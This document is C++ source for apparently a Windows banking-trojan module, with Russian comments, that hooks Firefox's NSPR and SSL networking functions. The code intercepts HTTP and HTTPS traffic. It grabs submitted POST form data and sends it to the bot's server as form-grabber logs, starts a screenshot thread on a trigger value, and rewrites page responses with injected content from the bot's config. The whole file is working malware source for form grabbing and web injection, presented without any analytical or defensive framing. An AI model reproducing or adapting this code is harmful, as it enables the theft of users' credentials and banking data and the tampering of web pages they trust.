#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "Exploit.h"
#include "Splice.h"
#include "Unhook.h"
#include "Loader.h"
#include "Firefox.h"
#include "BotConfig.h"
#include "Screens.h"
#include "Requests.h"
#include "BotHTTP.h"

#include <nss/ssl.h>
#include <nspr/prio.h>
#include <nspr/prnetdb.h>
#include <nspr/prlog.h>
#include <nspr/prerror.h>
#include <nspr/prprf.h>
#include <nspr/prinit.h>

#include <nspr/prtypes.h>

// Зарезервируем имя для объявления функций nspr4 апи
#define NSPR_API 


// Для избежания затрат процесорного времени при поиске функций в загруженных
// библиотеках кешируем найденные результаты
const DWORD ApiCasheSize = 4;
LPVOID ApiCashe[ApiCasheSize] = {NULL};

bool InitMozillaApiCashe()
{
	// Инициализировать кэш апи
	m_memset(&ApiCashe, 0, ApiCasheSize * sizeof(DWORD));
	return true;
}

// bool ACI = InitApiCashe();

/* Шаблоны для доступа к API */

// Шаблон для инициализации функций без параметров
template <DWORD ApiIndex, DWORD h, DWORD hash>
inline LPVOID pushargEx2()
{
	typedef LPVOID (NSPR_API (*newfunc))();
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func();
}

// Шаблон для инициализации функций с одним параметром
template <DWORD ApiIndex, DWORD h, DWORD hash, class A>
inline LPVOID pushargEx2(A a1)
{
	typedef LPVOID (NSPR_API *newfunc)(A);
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func(a1);
}

// Шаблон для инициализации функций с двумя парaметрами
template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B>
inline LPVOID pushargEx2(A a1, B b1)
{
	typedef LPVOID (NSPR_API *newfunc)(A, B);
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func(a1, b1);
}

// Шаблон для инициализации функций с тремя парaметрами
template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C>
inline LPVOID pushargEx2(A a1, B b1, C c1)
{
	typedef LPVOID (NSPR_API *newfunc)(A, B, C);
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func(a1, b1, c1);
}

// Описываем функции для работы с библиотекой Mozile FireFox;
#define pPR_GetError				pushargEx2<0, 10, 0x1D3347F>
#define pPR_MillisecondsToInterval	pushargEx2<1, 10, 0x5BF9111>
#define pPR_Poll					pushargEx2<2, 10, 0xFA1AB4F9>
#define pPR_SetError				pushargEx2<3, 10, 0x1FB347F>
//#define pPR_GetOSError				pushargEx<10,0xBEBFDE8D>
//#define pPR_ErrorToName				pushargEx<10,0xE2C4D38>
//#define pPR_Available				pushargEx<10,0xDDF2584>
//#define pPR_GetConnectStatus		pushargEx<10,0xA4989C58>


/* Описания констант */
char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};


typedef struct __request
{
	PRFileDesc *Fd;

	char *Url;
	char *Optional;

	DWORD dwVerb;

	bool bHttps;

	bool bIsInject;
	bool bDownloaded;
	bool bIsPart;

	LPBYTE pBuf;
	DWORD uBufSize;
	DWORD uBufPos;

	DWORD  uOverSize;
	DWORD  uOverPos;

	DWORD dwTry;

	PINJECTDATA pInject;
	DWORD dwInjCount;

	struct __request *next;
} REQUEST, *PREQUEST;

typedef PRInt32 (*PWRITE)( PRFileDesc *fd,const void *buf,PRInt32 amount ); 
typedef PRInt32 (*PREAD)(PRFileDesc *fd, void *buf, PRInt32 amount);
typedef PRStatus (*PCLOSE)( PRFileDesc *fd );
typedef PRStatus (*PCONNECT)( PRFileDesc *fd, const PRNetAddr *addr, PRIntervalTime timeout );
typedef PRFileDesc * (*PSSLIMPORTFD)( PRFileDesc *model, PRFileDesc *fd );

PREAD		PR_ReadReal;
PWRITE		PR_WriteReal;
PCLOSE		PR_CloseReal;
PCONNECT	PR_ConnectReal;
PSSLIMPORTFD SSL_ImportFDReal;


//     Глобальные данные

PREQUEST pStructHead;
PCHAR FFUserAgent;

//-----------------------

void InitFFGlobalData()
{
	pStructHead = NULL;
    FFUserAgent = NULL;
}


PREQUEST CreateReq()
{
	PREQUEST pRequest = (PREQUEST)MemAlloc( sizeof( PREQUEST ) );

	if ( pRequest == NULL )
	{
		return NULL;
	}

	m_memset( pRequest, 0, sizeof( PREQUEST ) );
	
	if ( pStructHead == NULL )
	{
		pStructHead = (PREQUEST)MemAlloc( sizeof( PREQUEST ) );

		pStructHead->next = pRequest;
		pRequest->next	  = NULL;

		return pRequest;
	} 

	PREQUEST tmp = NULL;

	for ( tmp = pStructHead; tmp->next != NULL; tmp = tmp->next );

	if ( tmp->next == NULL )
	{
		tmp->next	   = pRequest;
		pRequest->next = NULL;

		return pRequest;
	}

	return NULL;
}

PREQUEST FindRequestByFd( PRFileDesc *Fd )
{
	if ( pStructHead == NULL )
	{
		return NULL;
	}

	PREQUEST tmp = NULL;

	for ( tmp = pStructHead->next; tmp != NULL; tmp = tmp->next )
	{
		if ( tmp->Fd == Fd )
		{
			return tmp;
		}
	}

	return NULL;
}

bool DeleteFD( PRFileDesc *fd )
{
	if ( pStructHead == NULL )
	{
		return false;
	}

	PREQUEST tmp = NULL;
	PREQUEST prv = NULL;
	
	for ( tmp = pStructHead->next; tmp != NULL; prv = tmp, tmp = tmp->next )
	{
		if ( tmp->Fd == fd )
		{
			if ( prv == NULL )
			{
				pStructHead->next = tmp->next;
			}
			else
			{
				prv->next = tmp->next;
			}

			tmp->Fd	= NULL;

			StrFree( tmp->Url );
			StrFree( tmp->Optional );

			if ( tmp->pInject != NULL )
			{
				MemFree( tmp->pInject->Url );
					
				for ( DWORD i = 0; i < tmp->pInject->dwCount; i++ )
				{
					MemFree( tmp->pInject->data_before[i].Data );
					MemFree( tmp->pInject->data_inject[i].Data );
					MemFree( tmp->pInject->data_after[i].Data );
				}

				MemFree( tmp->pInject );
			}	

			if ( tmp->uBufSize )
			{
				MemFree( tmp->pBuf );
			}
		}		
	}

	return true;
}
//----------------------------------------------------------------------------

bool FindInjectFF(PREQUEST Request)
{
	PCHAR Method = HTTPMethodGET;
	if (Request->dwVerb == hmPOST)
		Method = HTTPMethodPOST;

	bool DelURL = false;
	PCHAR URL = Request->Url;

	if (Request->Optional != NULL)
	{
		URL = StrNew(3, URL, "?", Request->Optional);
		if (URL == NULL)
			return false;
        DelURL = true;
	}
	bool Result = GetInjectFromConfig(URL, Method, &Request->pInject, &Request->dwInjCount);\

	if (DelURL)
		StrFree(URL);

	return Result;
}
//----------------------------------------------------------------------------

char *GetHttpInfo( char *String, char *Buffer )
{
	char *Ret = NULL;

	if ( GetText( Buffer, &Ret, String, "\r\n" ) == -1 )
		return NULL;
	return Ret;
}
//----------------------------------------------------------------------------

bool UpdateContentLength(PREQUEST Request, bool FreeOldBuf)
{
	// Функция обновляет заголовок "Content-Length" в заголовках HTTP запроса
	char * Buffer = (char *)Request->pBuf;

	// копируем HTTP заголовок
	int HeaderOffset = m_istrstr(Buffer, "\r\n\r\n" );

	if (HeaderOffset == -1)
		return false;

	HeaderOffset += 4; // увеличиваем размер заголовка на "\r\n\r\n"

	PCHAR Header = StrNew(Buffer, HeaderOffset);
	if (Header == NULL)
		return false;

	// Лпределяем позицию параметра в заголовках

	m_lstrlwr(Header); // приводим заголовок к нижнему регистру
	char CL[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};

	int Pos = m_istrstr(Header, CL);
	StrFree(Header);
	if (Pos == -1)
		return false;

	// Копируем оригинальный заголовок
	DWORD ParamLen = m_lstrlen(CL);
	char *ParamName = (char*)MemAlloc(ParamLen + 1);
	if (ParamName == NULL)
		return false;
	m_memcpy(ParamName, Buffer + Pos, ParamLen);

	// Создаём строку с новым значением
	DWORD NewValue = m_lstrlen(Buffer + HeaderOffset);
	char NewContentLen[10];

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
	pwsprintfA(NewContentLen, "%d", NewValue);

	// Вписываем новое значение
	char *NewBuffer = NULL;

	bool Result = SubstituteText(Buffer, 0, &NewBuffer, ParamName, NewContentLen, "\r\n") >= 0;
	MemFree(ParamName);

	// Меняем буфер запроса
	if (Result)
	{
		if (FreeOldBuf)
            MemFree(Request->pBuf);

		Request->pBuf	   = (LPBYTE)NewBuffer;
		Request->uBufSize = m_lstrlen(NewBuffer);
	}

	return Result;
}
//----------------------------------------------------------------------------


bool DoInjectFF(PREQUEST Request)
{
    // Обрабатываем загруженные данные
	char *NewBuffer;

	bool Changed = false; // Признак сработавшего инжекта
	bool FreeBuf = false;
	THTTPSessionInfo Session; // Описание сессии

	Session.BrowserType = BROWSER_TYPE_FF;
	Session.UserAgent = FFUserAgent;
	Session.URL = Request->Url;

    // перебираем все маски для загруженного сайта
	for (DWORD i = 0; i < Request->dwInjCount; i++ )
	{		
		if ( HandleHTML((char*)Request->pBuf, NewBuffer, &Request->pInject[i], &Session))
		{
			Changed = true;

			// Если в исходный код были внесены изменения то заменяем старый
			// буффер на новый
			if (NewBuffer != NULL)
			{
				if (FreeBuf)
					MemFree(Request->pBuf);

				Request->pBuf	   = (LPBYTE)NewBuffer;
				Request->uBufSize = m_lstrlen(NewBuffer);

                UpdateContentLength(Request, FreeBuf);

				FreeBuf = true;
			}
		}
	}

	return Changed;
}

bool SubstituteHeader( char *Header )
{
	char gzip_deflate[] = {'g','z','i','p',',','d','e','f','l','a','t','e',0};

	DWORD dwStart = m_istrstr( Header, gzip_deflate );

	if ( dwStart != (DWORD)-1 )
	{
		for ( DWORD i = 0; i < m_lstrlen( gzip_deflate ); i++ )
		{
			Header[ dwStart + i ] = ' ';
		}
	}

	char Http[] = {'H','T','T','P','/','1','.',0};

	DWORD dwHttp = m_istrstr( Header, Http );

	if ( dwHttp != (DWORD)-1 )
	{
		Header[ dwHttp + m_lstrlen( Http ) ] = '0';
		return true;
	}

	return false;
}


LPDWORD dwHashPosts;
DWORD dwHashCount;

void AddHash( DWORD dwHash )
{
	if ( dwHashPosts == NULL )
	{
		if ( ( dwHashPosts = (LPDWORD)MemAlloc( sizeof( LPDWORD ) ) ) == NULL )
		{
			return;
		}
	}
	else
	{
		LPDWORD p = (LPDWORD)MemRealloc( dwHashPosts, GetMemSize( dwHashPosts ) + ( sizeof( LPDWORD ) * ( dwHashCount + 1 ) ) );

		if ( p == NULL )
		{
			return;
		}

		dwHashPosts = p;
	}

	dwHashPosts[ dwHashCount ] = dwHash;
	dwHashCount++;

	return;
}

bool FindHash( DWORD dwHash )
{
	for ( DWORD i = 0; i < dwHashCount; i++ )
	{
		if ( dwHashPosts[i] == dwHash )
			return true;
	}

	return false;
}

//----------------------------------------------------------------------------
void UpdateFFUserAgent(PCHAR Request)
{
    // Получаем имя агента
	if (FFUserAgent == NULL)
    	FFUserAgent = GetHTTPHeaderValue(Request, ParamUserAgent);
}

//----------------------------------------------------------------------------

bool ProcessPostData(PREQUEST pReq, PCHAR Optional)
{
	// Обработать POST данные

	// Проверяем библиотеку ScreenShot
	if ( CalcHash(Optional) == 0x24DE3210 )
	{
		StartThread( ScreensThread, NULL );
		return true;
	}

	// Отправляем данные формы на сервер
	PCHAR SendBuf = StrNew(3, pReq->Url, "?|POST:", Optional);
	if (SendBuf == NULL)
		return false;
	bool Res = SendFormGrabberLogs(pReq->Url, SendBuf, FFUserAgent, BROWSER_TYPE_FF, DATA_TYPE_FORMGRAB);
	StrFree(SendBuf);
    return Res;
}
//----------------------------------------------------------------------------

bool MakeInfo( PREQUEST pReq, PCHAR buf, int len )
{

	// Собираем информацию об отправляемом запросе
	PCHAR MethodName;
	PCHAR Path;

	// Разбираем тип запроса

	if (!ParseRequestFirstLine(buf, &MethodName, &Path, NULL))
		return false;

	pReq->dwVerb = GetMethodFromStr(MethodName);

	if (pReq->dwVerb != hmGET && pReq->dwVerb!= hmPOST)
    {
		StrFree(MethodName);
        StrFree(Path);
		return false;
	}

	// Собираем URL
	PCHAR Host = GetHTTPHeaderValue(buf, ParamHost);

	PCHAR Protocol = ProtocolHTTP;
	if (pReq->bHttps) Protocol = ProtocolHTTPS;

	pReq->Url = StrNew(5, Protocol, "://", Host, "/", Path);
	StrFree(Path);
	StrFree(Host);
    if (pReq->Url == NULL) return false;


	// Проверяем POST данные
	if (pReq->dwVerb == hmPOST)
	{
		UpdateFFUserAgent(buf);

		DWORD HeaderHash = CalcHash(buf);
		if (FindHash(HeaderHash)) return true;

        // Проверяем тип контента
		PCHAR CT = GetHTTPHeaderValue(buf, ParamContentType);
		DWORD Hash = CalcHash(CT);
		StrFree(CT);
		if (Hash != 0x6B3CDFEC) /* url_encoded*/
			return true;

		// Обрабатываем пост данные
		PCHAR Optional = GetURLEncodedPostData(buf);
        pReq->Optional = Optional;
		if (Optional != NULL && ProcessPostData(pReq, Optional))
			AddHash(HeaderHash);


	}

  /*	if ( len < 10 )
	{
		return false;
	}

	DWORD dwMethod = -1;

	char Post[] = {'P','O','S','T',' ',0};
	char Get[]	= {'G','E','T',' ',0};

	char *Method = NULL;

	if ( !m_lstrncmp( buf, Get, 4 ) )
	{
		dwMethod = VERB_IS_GET;
		Method   = Get;
	}
		
	if ( !m_lstrncmp( buf, Post, 5 ) )
	{
		dwMethod = VERB_IS_POST;
		Method   = Post;
	}

	if ( dwMethod == (DWORD)-1 )
	{
		return false;
	}


	//----------------------------------------------------------------------


	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	char *Host   = NULL;
	char *Params = NULL;

	char Server[] = {'H','o','s','t',':',' ',0};

	if ( GetText( buf, &Host, Server, "\r\n" ) != -1 )
	{
		if ( GetText( buf, &Params, Method, " " ) != -1 )
		{
			char *Type = NULL;

			char https[] = {'h','t','t','p','s',':','/','/',0};
			char http[]  = {'h','t','t','p',':','/','/',0};

			if ( pReq->bHttps )
			{
				Type = https;
			}
			else
			{
				Type = http;
			}

			if ( ( pReq->Url = (char*)MemAlloc( 1024 ) ) != NULL )
			{
				pwsprintfA( pReq->Url, "%s%s%s", Type, Host, Params );
				pReq->dwVerb = dwMethod;
			}

			MemFree( Params );
		}

		MemFree( Server );
		MemFree( Host );
	}

	DWORD dwHeaderHash = CalcHash( buf );

	if ( pReq->Url != NULL && pReq->dwVerb == VERB_IS_POST )
	{
		if ( !FindHash( dwHeaderHash ) )
		{
			char ContentType[] = {'C','o','n','t','e','n','t','-','T','y','p','e',':',' ',0 };
			char *Content = NULL;

			if ( GetText( buf, &Content, ContentType, "\r\n" ) != -1 )
			{
				DWORD dwContentHash = CalcHash( Content );

				MemFree( Content );

				if ( dwContentHash == 0x6B3CDFEC ) //urlencode
				{
					DWORD dwLen = 0;

					char *PostReq = GetPostData( buf, &dwLen, len );

					if ( PostReq != NULL && dwLen )
					{
						if ( ( pReq->Optional = (char*)MemAlloc( dwLen + 1 ) ) != NULL )
						{
							m_memcpy( pReq->Optional, PostReq, dwLen );
						}

						if ( CalcHash( pReq->Optional ) == 0x24DE3210 )
						{
							StartThread( ScreensThread, NULL );
							AddHash( dwHeaderHash );
							return true;
						}

						MemFree( PostReq );

						char PostTag[]  = {'|','P','O','S','T',':',0};

						char *SendBuffer = (char*)MemAlloc( dwLen + m_lstrlen( pReq->Url ) + m_lstrlen( PostTag ) + 2 );

						if ( SendBuffer != NULL )
						{
							m_lstrcpy( SendBuffer, pReq->Url );
							m_lstrcat( SendBuffer, "?" );
							m_lstrcat( SendBuffer, PostTag  );
							m_lstrcat( SendBuffer, pReq->Optional );

							if ( !m_lstrlen( FFUserAgent ) )
							{
								char UserAgentStr[] = {'U','s','e','r','-','A','g','e','n','t',':',' ', 0}; 
								char *pUserAgent		= GetHttpInfo(UserAgentStr, buf );

								if ( pUserAgent == NULL )
								{
									FFUserAgent[0] = '-';
									FFUserAgent[1] = '\0';
								}
								else
								{
									if ( m_lstrlen( pUserAgent ) <= 255 )
									{
										m_lstrcpy( FFUserAgent, pUserAgent );
									}
								}

								MemFree( pUserAgent );
							}

							if ( SendFormGrabberLogs(pReq->Url, SendBuffer, FFUserAgent, BROWSER_TYPE_FF, DATA_TYPE_FORMGRAB ) )
							{
								AddHash( dwHeaderHash );
							}

							MemFree( SendBuffer );
						}						
					}
				}
			}
		}
	}
   */
	return true;
}

PRInt32 PR_WriteHook( PRFileDesc *fd, const void* buf, PRInt32 amount )
{
	//  Метод отправки данных на сервер
	PREQUEST pReq = FindRequestByFd( fd );

	if ( pReq != NULL )
	{	
		if (MakeInfo( pReq, (char*)buf, (int)amount ) )
		{
			if ( FindInjectFF( pReq ) )
			{
				if ( SubstituteHeader( (char*)buf ) )
					pReq->bIsInject   = true;
			}
		}
	}

	return PR_WriteReal( fd, buf, amount );
}

DWORD GetHeader1( char *Buffer, char **Header )
{
	DWORD dwHeaderEnd = m_istrstr( Buffer, "\r\n\r\n" );

	char *Hdr = NULL;

	if ( dwHeaderEnd != (DWORD)-1 )
	{
		dwHeaderEnd += 4;

		if ( ( Hdr = (char*)MemAlloc( dwHeaderEnd + 1 ) ) != NULL )
		{
			m_memcpy( Hdr, Buffer, dwHeaderEnd );

			char HTTP[] = {'H','T','T','P',0};

			if ( !m_lstrncmp( Hdr, HTTP, 4 ) )
			{
				Hdr[ dwHeaderEnd ] = '\0';
				m_lstrlwr( Hdr );
			
				*Header = Hdr;
				return dwHeaderEnd;			
			}

			MemFree( Hdr );
		}
	}

	return -1;		
}

bool GetHeader2( char *Buffer, char **Header )
{
	char HTTP[] = {'H','T','T','P','/','1','.',0};

	if ( !m_lstrncmp( Buffer, HTTP, 7 ) )
	{
		DWORD dwSize = m_istrstr( Buffer, "\r\n\r\n" );

		if ( dwSize == (DWORD)-1 )
		{
			dwSize = m_lstrlen( Buffer );
		}

		dwSize += 4;

		char *Hdr = (char*)MemAlloc( dwSize + 1 );

		if ( Hdr != NULL )
		{
			m_memcpy( Hdr, Buffer, dwSize );
			Hdr[ dwSize ] = '\0';

			m_lstrlwr( Hdr );
			*Header = Hdr;
			return true;
		}
	}
	
	return false;		
}

int GetContentLen( char *Header )
{
	char *ContentLength = NULL;

	if ( GetText( Header, &ContentLength, HeaderContentLength, "\r\n" ) != -1 )
		return m_atoi( ContentLength ) + m_lstrlen( Header );

	return -1;
}

int GetSize( char *Buffer, LPDWORD dwSize )
{
	char *Header = NULL;

	if ( GetHeader2( Buffer, &Header ) )
	{
		DWORD dwHeaderEnd  = m_lstrlen( Header );
		DWORD dwContentLen = GetContentLen( Header );

		if ( dwContentLen == (DWORD)-1 )
		{
			DWORD dwOffset = 0;

			if ( ( dwOffset = (DWORD)GetHeader1( Buffer + dwHeaderEnd, &Header ) ) != -1 )
			{
				MemFree( Header );
				*dwSize = dwHeaderEnd + dwOffset - m_lstrlen( Header );
				return 1;
			}
			else
			{
				return 2;
			}
		}
		else
		{
			MemFree( Header );
			*dwSize = dwContentLen;
			return 3;
		}
	}

	MemFree( Header );

	return 0;
}


int MyReadRoutine(PREQUEST pReq)
{
	// Функция полностью читает файл
    DWORD BufSize = 4096;
	LPVOID bufp = MemAlloc(BufSize);

	PRInt32 nbytes = 0;

	PRInt32 npoll;

	PRIntervalTime delay = (PRIntervalTime)pPR_MillisecondsToInterval(10);

    do 
	{
		m_memset(bufp, 0, sizeof( bufp ) );

		nbytes = (PRInt32)PR_ReadReal( pReq->Fd, bufp, BufSize);

		if ( nbytes == 0 )
			return 0;

		if ( nbytes > 0 )
		{
			if ( pReq->pBuf == NULL )
			{
				if ( ( pReq->pBuf = (LPBYTE)MemAlloc( nbytes + 1 ) ) == NULL )
					return -1;
			}
			else
			{
				LPBYTE p = (LPBYTE)MemRealloc( pReq->pBuf, pReq->uBufSize + nbytes + 1 );

				if ( p == NULL )
					return -1;

				pReq->pBuf = p;
			}

			m_memcpy( pReq->pBuf + pReq->uBufSize, bufp, nbytes );
			pReq->uBufSize  += nbytes;
		}

        if ( nbytes == -1 )
		{
			if ( (PRErrorCode)pPR_GetError() == PR_WOULD_BLOCK_ERROR )
			{
				PRPollDesc *pfd = CreateStruct(PRPollDesc);//(PRPollDesc*)MemAlloc( sizeof( PRPollDesc* ) );

//				pfd[0].fd		 = pReq->Fd;
//				pfd[0].out_flags = 0;
//				pfd[0].in_flags  = PR_POLL_READ;

				pfd->fd		 = pReq->Fd;
				pfd->out_flags = 0;
				pfd->in_flags  = PR_POLL_READ;


//				npoll = (PRInt32)pPR_Poll( &pfd[0], 1, delay );
//				PRInt32 OutFlags = pfd[0].out_flags;
				npoll = (PRInt32)pPR_Poll(pfd, 1, delay );
				PRInt32 OutFlags = pfd ->out_flags;


				FreeStruct(pfd);
		 //		MemFree( pfd );

				if ( npoll == 1 )
				{
					if ( OutFlags & PR_POLL_READ )
						continue;
				}

				break;
			}
			break;
        }	
		
	}
	while ( 1 );

    MemFree(bufp);

	if ( pReq->uBufSize == 0 )
		return -1;
	else
		return 1;
}


void InjectPart( PREQUEST pReq, DWORD dwCopy )
{
	LPBYTE lpPartBuffer = NULL;
	REQUEST Request;

	Request.pBuf	   = pReq->pBuf + dwCopy;
	Request.uBufSize   = pReq->uBufPos - dwCopy;
	Request.pInject	   = pReq->pInject;
	Request.dwInjCount = pReq->dwInjCount;

	if ( DoInjectFF(&Request))
	{
		if ( dwCopy )
		{
			if ( ( lpPartBuffer = (LPBYTE)MemAlloc( dwCopy + 1 ) ) != NULL )
				m_memcpy( lpPartBuffer, pReq->pBuf, dwCopy );
		}

		if ( !dwCopy )
		{
			MemFree( pReq->pBuf );

			pReq->pBuf	    = Request.pBuf;
			pReq->uBufSize += Request.uBufSize - pReq->uBufPos;
			pReq->uBufPos   = Request.uBufSize;
		}
		else
		{
			if ( lpPartBuffer != NULL )
			{
				LPBYTE p = (LPBYTE)MemRealloc( lpPartBuffer, dwCopy + Request.uBufSize + 1 );

				if ( p != NULL )
				{
					lpPartBuffer = p;
					m_memcpy( lpPartBuffer + dwCopy, Request.pBuf, Request.uBufSize );

					MemFree( pReq->pBuf );

					pReq->pBuf		= lpPartBuffer;
					pReq->uBufSize += Request.uBufSize - ( pReq->uBufPos - dwCopy );
					pReq->uBufPos  += Request.uBufSize - ( pReq->uBufPos - dwCopy );
				}
			}
		}
	}
}

PRInt32 PR_ReadHook( PRFileDesc *fd, void* buf, PRInt32 amount )
{
	PREQUEST pReq = FindRequestByFd( fd );
	
	if ( pReq != NULL && pReq->bIsInject )
	{	
		int Bytes = MyReadRoutine( pReq );

		if ( !pReq->uBufSize )
		{
			return -1;
		}

		if ( !Bytes )
		{
			pReq->bDownloaded = true;
		}
			
		DWORD dwSize = 0;

		DWORD dwOld = pReq->uBufPos;

		while ( 1 )
		{
			int Size = GetSize( (char*)pReq->pBuf + pReq->uBufPos, &dwSize );

			if ( Size == 2 )
			{
				char *Header = NULL;

				if ( pReq->uBufPos != pReq->uBufSize )
				{
					GetHeader2( (char*)pReq->pBuf + pReq->uBufPos, &Header );
				}

				if ( pReq->bDownloaded )
				{
					pReq->uBufPos = pReq->uBufSize;
				}
				else
				{
					if ( Header != NULL && m_lstrlen( Header ) == pReq->uBufSize - pReq->uBufPos )
					{
						char H1[] = {'h','t','t','p','/','1','.','1',' ','2','0','0',0};
						char H2[] = {'h','t','t','p','/','1','.','0',' ','2','0','0',0};

						bool Fwd = true;

						if ( !m_lstrncmp( Header, H1, m_lstrlen( H1 ) ) || !m_lstrncmp( Header, H2, m_lstrlen( H2 ) ) )
						{
							Fwd = false;
						}

						if ( pReq->dwTry == 2 || Fwd )
						{
							pReq->uBufPos = pReq->uBufSize;
						}

						if ( !Fwd )
						{
							pReq->dwTry++;
						}
					}
				}
				
				MemFree( Header );				
				break;
			}
			else if ( Size == 1 || Size == 3 )
			{
				DWORD dwLen = pReq->uBufPos + dwSize;

				if ( dwLen < pReq->uBufSize )
				{
					pReq->uBufPos = dwLen;
				}
				else if ( dwLen == pReq->uBufSize )
				{
					pReq->uBufPos = dwLen;
					break;
				}
				else if ( dwLen > pReq->uBufSize )
				{
					break;
				}
			}
			else
			{
				break;
			}
		}	

		if ( dwOld != pReq->uBufPos )
		{
			InjectPart( pReq, dwOld );
		}

		if ( !pReq->uOverSize || pReq->uOverSize == dwOld )
		{
			pReq->uOverSize = pReq->uBufPos;
		}

		if ( pReq->uOverPos < pReq->uOverSize )
		{
			int dwMaxSize = min( amount, pReq->uOverSize - pReq->uOverPos );
			m_memcpy( buf, pReq->pBuf + pReq->uOverPos, dwMaxSize );
			pReq->uOverPos += dwMaxSize;
			return dwMaxSize;
		}

		if ( pReq->bDownloaded && pReq->uOverPos == pReq->uBufSize )
			return 0;

		return -1;
	}

	return PR_ReadReal(fd, buf, amount);
}

PRStatus PR_CloseHook( PRFileDesc *fd )
{
	DeleteFD( fd );
	return PR_CloseReal( fd );
}

PRStatus PR_ConnectHook( PRFileDesc *fd, const PRNetAddr *addr, PRIntervalTime timeout )
{
	PREQUEST pReq = FindRequestByFd( fd );

	if ( pReq == NULL )
	{
		pReq = CreateReq();

		if ( pReq != NULL )
		{
			pReq->Fd = fd;
		}
	}
	
	return PR_ConnectReal( fd, addr, timeout );
}


PRFileDesc * SSL_ImportFDHook( PRFileDesc *model, PRFileDesc *fd )
{
	PRFileDesc *SslFd = SSL_ImportFDReal( model, fd );

	if ( SslFd != NULL )
	{
		PREQUEST pReq = FindRequestByFd( SslFd );

		if ( pReq == NULL )
		{
			PREQUEST pReq = CreateReq();

			if ( pReq != NULL )
			{
				pReq->Fd	 = SslFd;
				pReq->bHttps = true;
			}
		}
	}

	return SslFd;
}


bool WINAPI CheckInCurrentDir( WCHAR *File )
{
	WCHAR *Directory = (WCHAR*)MemAlloc( 512 );

	if ( Directory == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( (HMODULE)pGetModuleHandleW( NULL ), Directory, 255 );

	for ( DWORD i = m_wcslen( Directory ) - 1; i > 0; i-- )
	{
		if ( Directory[i] == '\\' )
		{
			Directory[i + 1] = '\0';
			break;
		}
	}

	plstrcatW( Directory, File );

	if ( (DWORD)pGetFileAttributesW( Directory ) != INVALID_FILE_ATTRIBUTES )
	{
		MemFree( Directory );
		return true;
	}

	MemFree( Directory );
	return false;
}


bool HookMozillaFirefox()
{
	WCHAR nspr4[] = {'n','s','p','r','4','.','d','l','l',0};
	WCHAR ssl3[]  = {'s','s','l','3','.','d','l','l', 0 };

	if ( CheckInCurrentDir( nspr4 ) && CheckInCurrentDir( ssl3 ) )
	{
		//UnhookFF();
		InitFFGlobalData();
		InitializeConfig();
		InitScreenLib();

		return HookMozillaApi();
	}

	return false;
}

bool HookMozillaApi()
{
    InitMozillaApiCashe();

	pStructHead = NULL;
	dwHashPosts = NULL;
	dwHashCount = 0;

	DWORD PR_WriteHash	   = 0x7EFB3098;
	DWORD PR_ReadHash	   = 0xFA583271;
	DWORD PR_CloseHash	   = 0x3D3AB319;
	DWORD PR_ConnectHash   = 0xBF667EA2;
	DWORD SSL_ImportFDHash = 0xA1C4E024;

	if ( HookApi( 10, PR_ConnectHash, (DWORD)&PR_ConnectHook ) )
	{
	   __asm mov [ PR_ConnectReal ], eax
	}
	else
		return false;

	if ( HookApi( 10, PR_WriteHash, (DWORD)&PR_WriteHook ) )
	{
		__asm mov [ PR_WriteReal ], eax
	}
	else
		return false;


	if ( HookApi( 10, PR_ReadHash, (DWORD)&PR_ReadHook ) )
	{
		__asm mov [ PR_ReadReal ], eax
	}
	else
		return false;

	if ( HookApi( 10, PR_CloseHash, (DWORD)&PR_CloseHook ) )
	{
	   __asm mov [ PR_CloseReal ], eax
	}
	else
		return false;

	if ( HookApi( 11, SSL_ImportFDHash, (DWORD)&SSL_ImportFDHook ) )
	{
	   __asm mov [ SSL_ImportFDReal ], eax
	}
	else
		return false;

	return true;
}

